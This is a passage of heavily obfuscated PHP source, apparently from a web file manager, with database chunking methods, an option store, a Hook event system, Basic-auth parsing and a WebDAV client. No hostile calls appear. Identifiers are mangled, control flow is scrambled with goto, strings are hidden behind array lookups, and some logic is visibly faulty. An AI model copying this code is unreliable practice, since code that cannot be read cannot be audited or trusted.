$eáÙØáòù[362] . $fÎî‘³ƒÑÏ[3] . $eáÙØáòù[113]; $BïîŠÆ = "\x75\x70\144\x61\164\x65\x20{$FŞˆ›õŠÕ}\x20\163\x65\164\x20{$A‹Á„…»á¤}\40\167\150\145\x72\x65\40{$A¹Úõå¾ğ}\x3b"; $this->execute($BïîŠÆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($FÏßˆÎ›¸³ = false, $fòãğ‹ÅêŸ = false) { $this->_chunkEvent = $FÏßˆÎ›¸³; $this->_chunkEventParam = $fòãğ‹ÅêŸ; } private function chunkEventCheck($E¶‹µ˜•Ñ) { if (!$this->_chunkEvent) { return; } $Aèƒ¸ŠÈŸ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Aèƒ¸ŠÈŸ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][363]] = $E¶‹µ˜•Ñ; Hook::trigger($this->_chunkEvent, $Aèƒ¸ŠÈŸ); } public function addAll($F›˜Á¹Îğ, $BÑÚÙšÆ = array(), $cƒÄÇÍŒ = false) { goto D©…Àšêğ; D‰¸ä¡…ø‰: if (method_exists($this->db, $A‚°˜¡®Ìä[260])) { for ($E¼èÌ‘Æ¢ß = 0; $E¼èÌ‘Æ¢ß < count($F›˜Á¹Îğ); $E¼èÌ‘Æ¢ß += $Fã¦°‡») { $eÍ´™¼“¬ = array_slice($F›˜Á¹Îğ, $E¼èÌ‘Æ¢ß, $Fã¦°‡»); if (!is_array($eÍ´™¼“¬) || count($eÍ´™¼“¬) == 0) { break; } $BäÇ«„Œ‚ç = $this->db->insertAll($eÍ´™¼“¬, $BÑÚÙšÆ, $cƒÄÇÍŒ); $this->chunkEventCheck(count($eÍ´™¼“¬)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($F›˜Á¹Îğ as $f’÷çöƒ´Ñ => $Ağš³éÙ©¤) { $BäÇ«„Œ‚ç = $this->db->insert($Ağš³éÙ©¤, $BÑÚÙšÆ, $cƒÄÇÍŒ); } $this->commit(); } if (!1 !== $BäÇ«„Œ‚ç) { $FÌô³ŠÃÚ× = $this->getLastInsID(); if ($FÌô³ŠÃÚ×) { return $FÌô³ŠÃÚ×; } } return $BäÇ«„Œ‚ç; goto BÅÉ¹Í•ƒ; C¯¶½©ì×î: if (empty($F›˜Á¹Îğ)) { $this->error = think_lang($A‚°˜¡®Ìä[259]); return !1; } $BÑÚÙšÆ = $this->_parseOptions($BÑÚÙšÆ); foreach ($F›˜Á¹Îğ as $f’÷çöƒ´Ñ => $Ağš³éÙ©¤) { $F›˜Á¹Îğ[$f’÷çöƒ´Ñ] = $this->_facade($Ağš³éÙ©¤); $this->_beforeInsert($F›˜Á¹Îğ[$f’÷çöƒ´Ñ], $BÑÚÙšÆ); } goto D‰¸ä¡…ø‰; D©…Àšêğ: $A‚°˜¡®Ìä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; ignore_timeout(); $Fã¦°‡» = self::SQL_WHERE_IN_CHUNK; goto C¯¶½©ì×î; BÅÉ¹Í•ƒ: } public function save($f´Ôß‹Œ­ê = '', $F·¥Æƒ†ŠÂ = array()) { goto CË††ôˆ±ø; c¥½˜•Ñø¢: $aœèÅÈËë‰ = $fğæÔãê[$f•ËŸ‚®«é[263]][$b¦§¹šÄ¼][1]; $aœèÅÈËë‰ = is_array($aœèÅÈËë‰) ? $aœèÅÈËë‰ : array(); $F™½ïÀ¨© = count($aœèÅÈËë‰); goto F¤‰“£¢ã·; BáÁ»Áˆ¹¹: $b¦§¹šÄ¼ = $this->findWhereField($fğæÔãê); if (!$b¦§¹šÄ¼) { return parent::save($f´Ôß‹Œ­ê, $F·¥Æƒ†ŠÂ); } $B§ª†¿š¾ = 0; goto c¥½˜•Ñø¢; F¤‰“£¢ã·: for ($AŠà Ñïİ = 0; $AŠà Ñïİ < $F™½ïÀ¨©; $AŠà Ñïİ += $BÕ¾¥¦¾Ò) { $FŒˆ‚ÀŸ = array_slice($aœèÅÈËë‰, $AŠà Ñïİ, $BÕ¾¥¦¾Ò); if (!is_array($FŒˆ‚ÀŸ) || count($FŒˆ‚ÀŸ) == 0) { break; } $fğæÔãê[$f•ËŸ‚®«é[263]][$b¦§¹šÄ¼][1] = $FŒˆ‚ÀŸ; $this->optionsValue($fğæÔãê); $B§ª†¿š¾ += parent::save($f´Ôß‹Œ­ê, $F·¥Æƒ†ŠÂ); $this->chunkEventCheck(count($FŒˆ‚ÀŸ)); } $this->chunkEventSet(); return $B§ª†¿š¾; goto D–¾°Ÿ¬ÜŠ; CË††ôˆ±ø: $f•ËŸ‚®«é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÕ¾¥¦¾Ò = self::SQL_WHERE_IN_CHUNK; $fğæÔãê = $this->optionsValue(); goto BáÁ»Áˆ¹¹; D–¾°Ÿ¬ÜŠ: } public function add($dšŒ…Ş„ó› = '', $C´§Š³…éÏ = array(), $aÃ¹„ÇÜ = false) { if ($this->addTaskStatus && is_array($dšŒ…Ş„ó›)) { $this->addTaskData[] = $dšŒ…Ş„ó›; return; } return parent::add($dšŒ…Ş„ó›, $C´§Š³…éÏ, $aÃ¹„ÇÜ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Aõ‰Öšï«ã = array()) { goto a¨¼‘…í; A†ç¹¿¸À¥: $aÕ…õ¹îò… = $this->findWhereField($F½åƒ…¯×); if (!$aÕ…õ¹îò… || isset($F½åƒ…¯×[$e³ñùœˆ«ƒ[280]]) || isset($F½åƒ…¯×[$e³ñùœˆ«ƒ[340]])) { return parent::select($Aõ‰Öšï«ã); } $c¼ÇÑ§ó¤´ = $F½åƒ…¯×[$e³ñùœˆ«ƒ[263]][$aÕ…õ¹îò…][1]; goto DÄ¾—‡×®¤; a¨¼‘…í: $e³ñùœˆ«ƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÑ¸³À‹Ô = self::SQL_WHERE_IN_CHUNK; $F½åƒ…¯× = $this->optionsValue(); goto A†ç¹¿¸À¥; DÄ¾—‡×®¤: $c¼ÇÑ§ó¤´ = is_array($c¼ÇÑ§ó¤´) ? $c¼ÇÑ§ó¤´ : array(); $B ³¦¸Ä = null; for ($fÔ…£¯§Û = 0; $fÔ…£¯§Û < count($c¼ÇÑ§ó¤´); $fÔ…£¯§Û += $fÑ¸³À‹Ô) { $EÊµ÷¯µ˜ = array_slice($c¼ÇÑ§ó¤´, $fÔ…£¯§Û, $fÑ¸³À‹Ô); if (!is_array($EÊµ÷¯µ˜) || count($EÊµ÷¯µ˜) == 0) { break; } $F½åƒ…¯×[$e³ñùœˆ«ƒ[263]][$aÕ…õ¹îò…][1] = $EÊµ÷¯µ˜; $this->optionsValue($F½åƒ…¯×); $dí›­ Åšï = parent::select($Aõ‰Öšï«ã); if (!$dí›­ Åšï) { continue; } if (is_null($B ³¦¸Ä)) { $B ³¦¸Ä = array(); } $B ³¦¸Ä = array_merge($B ³¦¸Ä, $dí›­ Åšï); } goto E½¼¬ˆ¿¥š; E½¼¬ˆ¿¥š: return $B ³¦¸Ä; goto cÌ”‰–ØÈ; cÌ”‰–ØÈ: } public function delete($EÕ—¿ø’ = array()) { goto a³Øë¼¬Ÿƒ; DöšÏÙÑ´â: $dÃá‚²’˜ = $b¼Ëİ«ŞË´[$B¾ÔÌä¥¿Õ[263]][$cˆ·òê›æ][1]; $dÃá‚²’˜ = is_array($dÃá‚²’˜) ? $dÃá‚²’˜ : array(); for ($AÍì‡òö«† = 0; $AÍì‡òö«† < count($dÃá‚²’˜); $AÍì‡òö«† += $aÒ‚­¶©„) { $cö…Ò¾†‰¦ = array_slice($dÃá‚²’˜, $AÍì‡òö«†, $aÒ‚­¶©„); if (!is_array($cö…Ò¾†‰¦) || count($cö…Ò¾†‰¦) == 0) { break; } $b¼Ëİ«ŞË´[$B¾ÔÌä¥¿Õ[263]][$cˆ·òê›æ][1] = $cö…Ò¾†‰¦; $this->optionsValue($b¼Ëİ«ŞË´); $c¤ÑÉÀè += parent::delete($EÕ—¿ø’); } goto dìì÷ª†Üğ; a³Øë¼¬Ÿƒ: $B¾ÔÌä¥¿Õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÒ‚­¶©„ = self::SQL_WHERE_IN_CHUNK; $b¼Ëİ«ŞË´ = $this->optionsValue(); goto DíÇôÚ„Æ; dìì÷ª†Üğ: return $c¤ÑÉÀè; goto FõÚ‰‡îÒ; DíÇôÚ„Æ: $cˆ·òê›æ = $this->findWhereField($b¼Ëİ«ŞË´); if (!$cˆ·òê›æ) { return parent::delete($EÕ—¿ø’); } $c¤ÑÉÀè = 0; goto DöšÏÙÑ´â; FõÚ‰‡îÒ: } private function findWhereField($dËìÙç‹¯Ö) { $eÈƒê‚£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f®®Áƒ·¯Ç = self::SQL_WHERE_IN_CHUNK; if (!is_array($dËìÙç‹¯Ö) || !is_array($dËìÙç‹¯Ö[$eÈƒê‚£[263]])) { return !1; } foreach ($dËìÙç‹¯Ö[$eÈƒê‚£[263]] as $E©á°­áë— => $dàëŸõ) { if (is_array($dàëŸõ) && isset($dàëŸõ[0]) && is_string($dàëŸõ[0]) && strtolower($dàëŸõ[0]) == $eÈƒê‚£[7] && is_array($dàëŸõ[1]) && count($dàëŸõ[1]) > $f®®Áƒ·¯Ç) { ignore_timeout(); return $E©á°­áë—; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\155\x4f\160\x74\151\x6f\156"; public $field = array(); public function listData($AÒ§×Ôè³í = false, $cìâ‡¡¾Ã = "\155\x6f\144\151\146\171\x54\x69\x6d\145", $DÇÎš£æ¤É = false) { $bõ¼·ª¤Á = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$bõ¼·ª¤Á) { return $AÒ§×Ôè³í ? null : array(); } if (!$AÒ§×Ôè³í) { $bõ¼·ª¤Á = array_filter(array_values($bõ¼·ª¤Á)); return array_sort_by($bõ¼·ª¤Á, $cìâ‡¡¾Ã, $DÇÎš£æ¤É); } return $bõ¼·ª¤Á[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][364] . $AÒ§×Ôè³í]; } public function insert($CÄ‹ä§¶¬ˆ) { goto E§…ˆ¹Ã‘µ; c«æÌœõÂª: $fã¼Çî‚Ê« = $fã¼Çî‚Ê« ? $fã¼Çî‚Ê« : 0; $CÄ‹ä§¶¬ˆ[$bø» ²Ã·[367]] = ++$fã¼Çî‚Ê«; $CÄ‹ä§¶¬ˆ[$bø» ²Ã·[187]] = time(); goto e¤Ñ•“¦Å; a©¶öñöäÂ: return $fã¼Çî‚Ê«; goto d±Œ‹Áàí¿; e¤Ñ•“¦Å: $CÄ‹ä§¶¬ˆ[$bø» ²Ã·[107]] = time(); Model($this->modelType)->set($bø» ²Ã·[365], $fã¼Çî‚Ê«, $this->optionType . $bø» ²Ã·[366]); Model($this->modelType)->set($bø» ²Ã·[364] . $fã¼Çî‚Ê«, $CÄ‹ä§¶¬ˆ, $this->optionType); goto a©¶öñöäÂ; E§…ˆ¹Ã‘µ: $bø» ²Ã· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÄ‹ä§¶¬ˆ = array_field_key($CÄ‹ä§¶¬ˆ, $this->field); $fã¼Çî‚Ê« = Model($this->modelType)->get($bø» ²Ã·[365], $this->optionType . $bø» ²Ã·[366]); goto c«æÌœõÂª; d±Œ‹Áàí¿: } public function update($c†©«Ñ•“, $a§ÔÄÕŒÛ¨) { goto dµí—è‚§ö; dµí—è‚§ö: $d™«Èé×ê¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a§ÔÄÕŒÛ¨ = array_field_key($a§ÔÄÕŒÛ¨, $this->field); $F¼»²°²Ã = $this->listData($c†©«Ñ•“); goto B¬ë¨Æ“‘³; B¬ë¨Æ“‘³: if (!$F¼»²°²Ã) { return !1; } $a§ÔÄÕŒÛ¨ = array_merge($F¼»²°²Ã, $a§ÔÄÕŒÛ¨); $a§ÔÄÕŒÛ¨[$d™«Èé×ê¦[107]] = time(); goto AæŞİìø‹£; AæŞİìø‹£: return Model($this->modelType)->set($d™«Èé×ê¦[364] . $c†©«Ñ•“, $a§ÔÄÕŒÛ¨, $this->optionType); goto b–Ñ»Ã†öì; b–Ñ»Ã†öì: } public function remove($Aæ„‡å¦Æ) { return Model($this->modelType)->remove($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][364] . $Aæ„‡å¦Æ, $this->optionType); } public function clear() { $EÎøà‘†äô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Model($this->modelType)->remove($EÎøà‘†äô[365], $this->optionType . $EÎøà‘†äô[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($BŠØç£™’, $DŒêÍóÔ£É) { if (!$DŒêÍóÔ£É) { return !1; } $Bé¥ƒŞÜ¡· = $this->listData(); $Bé¥ƒŞÜ¡· = array_to_keyvalue($Bé¥ƒŞÜ¡·, $BŠØç£™’); return isset($Bé¥ƒŞÜ¡·[$DŒêÍóÔ£É]) ? $Bé¥ƒŞÜ¡·[$DŒêÍóÔ£É] : !1; } public function findByName($a¶ÑŒß¸˜â) { return $this->findByKey($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28], $a¶ÑŒß¸˜â); } protected function resetData($AµÇ‡ğàè) { $e§¹Ù’Ğ·Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AµÇ‡ğàè = is_array($AµÇ‡ğàè) ? $AµÇ‡ğàè : array(); $f£ˆº®Ã‹ë = array(); for ($e—¸¼£ãˆ¡ = 0; $e—¸¼£ãˆ¡ < count($AµÇ‡ğàè); $e—¸¼£ãˆ¡++) { $f£ˆº®Ã‹ë[$e§¹Ù’Ğ·Ò[364] . $AµÇ‡ğàè[$e—¸¼£ãˆ¡][$e§¹Ù’Ğ·Ò[367]]] = $AµÇ‡ğàè[$e—¸¼£ãˆ¡]; } return Model($this->modelType)->set($f£ˆº®Ã‹ë, !1, $this->optionType); } private function getAutoName($a…µöÌŒ­‘) { $Bµò‡¦Üã¤ = array_to_keyvalue($this->listData(), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]); if (!$Bµò‡¦Üã¤ || !isset($Bµò‡¦Üã¤[$a…µöÌŒ­‘])) { return $a…µöÌŒ­‘; } for ($eÌ­ä ¥å± = 1; $eÌ­ä ¥å± < count($Bµò‡¦Üã¤); $eÌ­ä ¥å±++) { $däóŠšÄ„– = $a…µöÌŒ­‘ . "\50{$eÌ­ä ¥å±}\x29"; if (!isset($Bµò‡¦Üã¤[$däóŠšÄ„–])) { return $däóŠšÄ„–; } } return $däóŠšÄ„–; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($F¤³îˆÔæ = false, $E Æ†¬¸— = '', $dØåÈî¦®‡ = false) { goto F¢ËôÄ«­; F¢ËôÄ«­: $d÷Â«›–†Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eğ‹öÊ°…º = $this->cacheGet($E Æ†¬¸—); $cİÈ†º‡˜ = $this->optionDefault($E Æ†¬¸—); goto eâ¾àÇ›Ã‰; fİÊ¤ÂÆê°: $this->cacheSet($E Æ†¬¸—, $eğ‹öÊ°…º); $eğ‹öÊ°…º = array_merge($cİÈ†º‡˜, $eğ‹öÊ°…º); return $F¤³îˆÔæ ? $eğ‹öÊ°…º[$F¤³îˆÔæ] : $eğ‹öÊ°…º; goto b…¼îÚšêá; CÜÃŒã–ğ°: $eğ‹öÊ°…º = $this->where($càø×˜éÛ)->select(); $eğ‹öÊ°…º = array_to_keyvalue($eğ‹öÊ°…º, $d÷Â«›–†Ì[89], $d÷Â«›–†Ì[359]); foreach ($eğ‹öÊ°…º as $aİïƒå÷Ì => $eè‹·¸ºÀ) { if ($dØåÈî¦®‡ || in_array($aİïƒå÷Ì, $this->jsonField)) { $eğ‹öÊ°…º[$aİïƒå÷Ì] = json_decode($eè‹·¸ºÀ, !0); } } goto fİÊ¤ÂÆê°; eâ¾àÇ›Ã‰: $cİÈ†º‡˜ = is_array($cİÈ†º‡˜) ? $cİÈ†º‡˜ : array(); if (is_array($eğ‹öÊ°…º)) { $eğ‹öÊ°…º = array_merge($cİÈ†º‡˜, $eğ‹öÊ°…º); return $F¤³îˆÔæ ? isset($eğ‹öÊ°…º[$F¤³îˆÔæ]) ? $eğ‹öÊ°…º[$F¤³îˆÔæ] : null : $eğ‹öÊ°…º; } $càø×˜éÛ = $this->filterWhere(array($d÷Â«›–†Ì[29] => $E Æ†¬¸—)); goto CÜÃŒã–ğ°; b…¼îÚšêá: } public function set($BÔîÌ‚’¥Ô, $e£×¦‹Ê„ = false, $fìÏÌµï¾ = '') { goto d¯ ·ßà¤Æ; d¯ ·ßà¤Æ: $EàÊÙ‘í° =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->cacheRemove($fìÏÌµï¾); $B›×¶¨°ğÁ = array(); goto C‹’‹ˆ‡; FùÔ‡ËÛ: return $this->addAll($B›×¶¨°ğÁ, array(), !0); goto EáØ¿·ñ ; C‹’‹ˆ‡: $c£ÊâÓ»­ = is_array($BÔîÌ‚’¥Ô) ? $BÔîÌ‚’¥Ô : array($BÔîÌ‚’¥Ô => $e£×¦‹Ê„); foreach ($c£ÊâÓ»­ as $DÎùîåŒÛº => $EòìØ —¯) { if (is_array($EòìØ —¯)) { $EòìØ —¯ = json_encode_force($EòìØ —¯); } $this->checkLength($EòìØ —¯, !1, $this->tableName . $EàÊÙ‘í°[4] . $BÔîÌ‚’¥Ô); $EòìØ —¯ = self::textEncode($EòìØ —¯); $c£ÊâÓ»­ = array($EàÊÙ‘í°[29] => $fìÏÌµï¾, $EàÊÙ‘í°[89] => $DÎùîåŒÛº, $EàÊÙ‘í°[359] => $EòìØ —¯); $B›×¶¨°ğÁ[] = $this->filterWhere($c£ÊâÓ»­); } if (!$B›×¶¨°ğÁ) { return !0; } goto FùÔ‡ËÛ; EáØ¿·ñ : } protected function optionDefault($F˜Ó©–¹ë = '') { return !1; } public function setDeep($bœùìÍŒºß, $BŸØÖ°òˆŸ = false, $d“çÖ°¾´Ë = '') { $DÀ —ä¤‡ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][91], $bœùìÍŒºß); $FË©â†çç = $this->get(); array_set_value($FË©â†çç, $bœùìÍŒºß, $BŸØÖ°òˆŸ); $this->set($DÀ —ä¤‡[0], $FË©â†çç[$DÀ —ä¤‡[0]], $d“çÖ°¾´Ë); } public function remove($a¬Ú…¬øòç, $fîâ¹¿İ‰ = '') { $D—›ÃÅÌñä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->cacheRemove($fîâ¹¿İ‰); $eÕÅˆ“”î‘ = $this->filterWhere(array($D—›ÃÅÌñä[89] => $a¬Ú…¬øòç, $D—›ÃÅÌñä[29] => $fîâ¹¿İ‰)); if (is_null($a¬Ú…¬øòç)) { unset($eÕÅˆ“”î‘[$D—›ÃÅÌñä[89]]); } return $this->where($eÕÅˆ“”î‘)->delete(); } public function cacheSet($B¹¢î×„÷â, $eÜöÚ‹ÜÑ = false) { return Cache::set($this->cacheKey($B¹¢î×„÷â), $eÜöÚ‹ÜÑ); } public function cacheGet($E‡êµ­ï‹) { return Cache::get($this->cacheKey($E‡êµ­ï‹)); } public function cacheRemove($Eö×ˆ†ˆ¥) { return Cache::remove($this->cacheKey($Eö×ˆ†ˆ¥)); } protected function filterWhere($DçÅ„…ºŒ•) { return $DçÅ„…ºŒ•; } protected function cacheKey($Dë‹Óó) { return $Dë‹Óó; } } goto fÃô…¹ğ’Ò; A’ğœòôíŒ: class Hook { private static $events = array(); public static function get($Dîˆ£šÜÈ = false) { if (!$Dîˆ£šÜÈ) { return self::$events; } else { return self::$events[$Dîˆ£šÜÈ]; } } public static function apply($céº…›ñ¸, $dˆ…¥â­ô¼ = array()) { $Aø¦„«ëä¥ = ActionApply($céº…›ñ¸, $dˆ…¥â­ô¼); if (is_string($céº…›ñ¸)) { Hook::trigger($céº…›ñ¸); } return $Aø¦„«ëä¥; } public static function bind($bÑÖ´¢Ñ¦Ì, $d„ô»ÃÊ, $AÚÑâ¦±àà = false) { $b§àê•Ê‰† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset(self::$events[$bÑÖ´¢Ñ¦Ì])) { self::$events[$bÑÖ´¢Ñ¦Ì] = array(); } self::$events[$bÑÖ´¢Ñ¦Ì][] = array($b§àê•Ê‰†[1752] => $d„ô»ÃÊ, $b§àê•Ê‰†[1753] => $AÚÑâ¦±àà, $b§àê•Ê‰†[1754] => 0); } public static function once($A¼»—›”ˆµ, $Eš„¬ÈîŒ²) { self::bind($A¼»—›”ˆµ, $Eš„¬ÈîŒ², !0); } public static function unbind($DÂ¶Õ¢¤Ïõ, $fÊÔ¤™™® = false) { if (!$fÊÔ¤™™®) { self::$events[$DÂ¶Õ¢¤Ïõ] = array(); return; } $d¢æ’šâ”½ = self::$events[$DÂ¶Õ¢¤Ïõ]; self::$events[$DÂ¶Õ¢¤Ïõ] = array(); if (!is_array($d¢æ’šâ”½)) { return; } for ($FÌñˆ²—õò = 0; $FÌñˆ²—õò < count($d¢æ’šâ”½); $FÌñˆ²—õò++) { if ($d¢æ’šâ”½[$FÌñˆ²—õò][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1752]] == $fÊÔ¤™™®) { continue; } self::$events[$DÂ¶Õ¢¤Ïõ][] = $d¢æ’šâ”½[$FÌñˆ²—õò]; } } public static function filter($Fù©ÙÜÂª, $b“÷ÏÚŒÎš) { goto dÊïÇ¯”ö‹; DàóÄå‡: for ($eöµ£š‘ì÷ = 0; $eöµ£š‘ì÷ < count($FÀ«óÚÉ¹); $eöµ£š‘ì÷++) { $FàÁ÷·ä¤é = $FÀ«óÚÉ¹[$eöµ£š‘ì÷]; if ($FàÁ÷·ä¤é[$A–ˆÜ¹¸×[1753]] && $FàÁ÷·ä¤é[$A–ˆÜ¹¸×[1754]] > 1) { continue; } self::$events[$Fù©ÙÜÂª][$eöµ£š‘ì÷][$A–ˆÜ¹¸×[1754]] = $FàÁ÷·ä¤é[$A–ˆÜ¹¸×[1754]] + 1; $E©İ÷è‹´Œ = self::apply($FàÁ÷·ä¤é[$A–ˆÜ¹¸×[1752]], array($b‰î¿‘Ç‘¯)); if (gettype($E©İ÷è‹´Œ) == gettype($b‰î¿‘Ç‘¯)) { $b‰î¿‘Ç‘¯ = $E©İ÷è‹´Œ; } } return $b‰î¿‘Ç‘¯; goto c±ƒ‚Æ¥ÙÙ; dÊïÇ¯”ö‹: $A–ˆÜ¹¸× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E·Ÿ×Ò·Æ = self::$events; if (!isset($E·Ÿ×Ò·Æ[$Fù©ÙÜÂª])) { return $b“÷ÏÚŒÎš; } goto aËìÖŠÚæ; aËìÖŠÚæ: $FÀ«óÚÉ¹ = $E·Ÿ×Ò·Æ[$Fù©ÙÜÂª]; $b‰î¿‘Ç‘¯ = $b“÷ÏÚŒÎš; if (!is_array($FÀ«óÚÉ¹) || count($FÀ«óÚÉ¹) == 0) { return $b‰î¿‘Ç‘¯; } goto DàóÄå‡; c±ƒ‚Æ¥ÙÙ: } public static function trigger($eãòœšÒ¹Ê) { goto cÛ¼éÈòî; fù‹‡¼œÊ†: return $f›ƒêÆÅùŒ; goto Dñ¼ßä‰™¡; c•‘šˆ¿÷ì: if (!isset($D°´™Ä¤Ç½[$eãòœšÒ¹Ê])) { return $f›ƒêÆÅùŒ; } $BäõÁ¹ªÉ¸ = $D°´™Ä¤Ç½[$eãòœšÒ¹Ê]; if (!is_array($BäõÁ¹ªÉ¸) || count($BäõÁ¹ªÉ¸) == 0) { return $f›ƒêÆÅùŒ; } goto F®Ç¡…¡×ã; cÛ¼éÈòî: $dÌËàĞôˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D°´™Ä¤Ç½ = self::$events; $f›ƒêÆÅùŒ = !1; goto c•‘šˆ¿÷ì; F®Ç¡…¡×ã: $Aâç´š‰¡§ = func_get_args(); array_shift($Aâç´š‰¡§); for ($dÜà»’îÏÏ = 0; $dÜà»’îÏÏ < count($BäõÁ¹ªÉ¸); $dÜà»’îÏÏ++) { $e¯ìÔ†ì­ñ = $BäõÁ¹ªÉ¸[$dÜà»’îÏÏ]; if ($e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1753]] && $e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1754]] > 1) { continue; } if (defined($dÌËàĞôˆ[1755]) && GLOBAL_LOG_HOOK) { write_log($eãòœšÒ¹Ê . $dÌËàĞôˆ[1756] . $e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1752]], $dÌËàĞôˆ[1757]); } self::$events[$eãòœšÒ¹Ê][$dÜà»’îÏÏ][$dÌËàĞôˆ[1754]] = $e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1754]] + 1; $EİµƒÅä÷œ = self::apply($e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1752]], $Aâç´š‰¡§); if (defined($dÌËàĞôˆ[1755]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $dÌËàĞôˆ[1757]); if ($e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1754]] == 200) { $D‹Øì‚áÏŸ = is_array($e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1752]]) ? json_encode_force($e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1752]]) : $e¯ìÔ†ì­ñ[$dÌËàĞôˆ[1752]]; write_log($dÌËàĞôˆ[1758] . $eãòœšÒ¹Ê . $dÌËàĞôˆ[1759] . $D‹Øì‚áÏŸ, $dÌËàĞôˆ[1760]); } } $f›ƒêÆÅùŒ = is_null($EİµƒÅä÷œ) ? $f›ƒêÆÅùŒ : $EİµƒÅä÷œ; } goto fù‹‡¼œÊ†; Dñ¼ßä‰™¡: } } class HttpAuth { public static function get() { $EæòÉç…¼ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B×¾Ê²õªÇ = $EæòÉç…¼ˆ[33]; $f¿ÃäÌÏ‡Ÿ = $EæòÉç…¼ˆ[33]; if (isset($_SERVER[$EæòÉç…¼ˆ[1761]])) { $B×¾Ê²õªÇ = $_SERVER[$EæòÉç…¼ˆ[1761]]; $f¿ÃäÌÏ‡Ÿ = $_SERVER[$EæòÉç…¼ˆ[1762]]; } elseif (isset($_SERVER[$EæòÉç…¼ˆ[1763]])) { $a‰óÅï÷í£ = $_SERVER[$EæòÉç…¼ˆ[1763]]; if (strpos(strtolower($a‰óÅï÷í£), $EæòÉç…¼ˆ[1764]) === 0) { $Dè—á½ôËõ = explode($EæòÉç…¼ˆ[4], base64_decode(substr($a‰óÅï÷í£, 6))); $B×¾Ê²õªÇ = isset($Dè—á½ôËõ[0]) ? $Dè—á½ôËõ[0] : $EæòÉç…¼ˆ[33]; $f¿ÃäÌÏ‡Ÿ = isset($Dè—á½ôËõ[1]) ? $Dè—á½ôËõ[1] : 0; } } return array($EæòÉç…¼ˆ[537] => $B×¾Ê²õªÇ, $EæòÉç…¼ˆ[893] => $f¿ÃäÌÏ‡Ÿ); } public static function error() { goto aèŠîŞŠ¬; A“âìŠÚß: header($d‰Ë–éÎÅİ[1767]); header($d‰Ë–éÎÅİ[1768]); header($d‰Ë–éÎÅİ[1262]); goto F®ğ³ß²; aèŠîŞŠ¬: $d‰Ë–éÎÅİ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; header($d‰Ë–éÎÅİ[1765]); header($d‰Ë–éÎÅİ[1766]); goto A“âìŠÚß; F®ğ³ß²: die; goto EŠñ©¿’˜; EŠñ©¿’˜: } public static function make($DˆÇÆÓËÚë, $bâïö°Ï) { $fµÈÈ¨ÚŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return $fµÈÈ¨ÚŸ[1769] + base64_encode($DˆÇÆÓËÚë . $fµÈÈ¨ÚŸ[4] . $bâïö°Ï); } } class HttpDavClient { public function __construct($FìÙ•’ö»î, $c·¾„ ëÒÒ, $C¯‰±§¦ù») { $this->header = array(); $this->userName = $c·¾„ ëÒÒ; $this->userPassowrd = $C¯‰±§¦ù»; } protected function makePath($c¢—…œÉÈÂ) { return $c¢—…œÉÈÂ; } protected function setHeader($DçÙñÈÍÙ, $FÒ—Äİòç­ = false) { if ($FÒ—Äİòç­ === !1) { $this->header[] = $DçÙñÈÍÙ; } else { $this->header[] = $DçÙñÈÍÙ . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][876] . $FÒ—Äİòç­; } } public function move($fñÑ°ÒÏ‡ì, $Déİ©›˜¢Ô, $cÄ¦À’Åè¬ = '') { $eÁº¹á¦¹÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->setHeader($eÁº¹á¦¹÷[1770], $this->makePath($Déİ©›˜¢Ô)); $this->setHeader($eÁº¹á¦¹÷[1771], $eÁº¹á¦¹÷[1772]); if ($cÄ¦À’Åè¬) { $this->setHeader($eÁº¹á¦¹÷[1773], $eÁº¹á¦¹÷[921] . $cÄ¦À’Åè¬ . $eÁº¹á¦¹÷[924]); } return $this->send($eÁº¹á¦¹÷[1774], $fñÑ°ÒÏ‡ì); } public function 